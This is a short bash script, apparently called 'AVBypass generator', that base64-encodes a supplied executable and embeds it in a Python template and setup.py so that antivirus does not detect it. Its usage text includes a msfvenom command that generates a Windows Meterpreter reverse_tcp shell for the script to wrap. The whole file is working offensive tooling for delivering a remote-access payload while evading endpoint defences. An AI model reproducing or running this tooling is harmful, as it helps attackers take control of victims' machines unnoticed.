#!/bin/bash
# AVBypass generator by n0a 
# http://n0a.pw 

if [ -n "$1" ]; then
	if test -f "$1"; then
		echo "[+] File $1 exists."
			NAME=$(echo $1 | sed -n 's/^\(.*\/\)*\(.*\)/\2/p' | sed 's/\.[^.]*$//' | sed 's/\./_/') 
			if [ -d $NAME ]; then
				echo "[-] Directory $NAME exists. Cleanup first."
			else
				mkdir $NAME && cp src/* $NAME/ && mv $NAME/blank.py $NAME/$NAME.py
				cat $1 | base64 | sed s/$/\"\"\"/ | tr -d '\n' > $NAME/b64.txt
				printf '%s\n' '/2PDXQjrZmK4umdM6/r '$NAME'/b64.txt' 1 '/2PDXQjrZmK4umdM6/d' w | ed $NAME/$NAME.py > /dev/null 2>&1
				cat src/setup.py | sed 's/2UosRifdvU3nNf2C/'$NAME'.py/' > $NAME/setup.py
				rm $NAME/b64.txt
				echo "[+] Generate $1 complete."
			fi
	else
		echo "[-] FIle $1 not exist."
		echo "Example run: ./gen.sh shell.exe"
	fi
else
	echo "AVBypass generator. More info: https://n0a.pw/meterpreter-av-bypass"
	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4433 -f exe > shell.exe"
	echo "Example run: ./gen.sh shell.exe"
fi


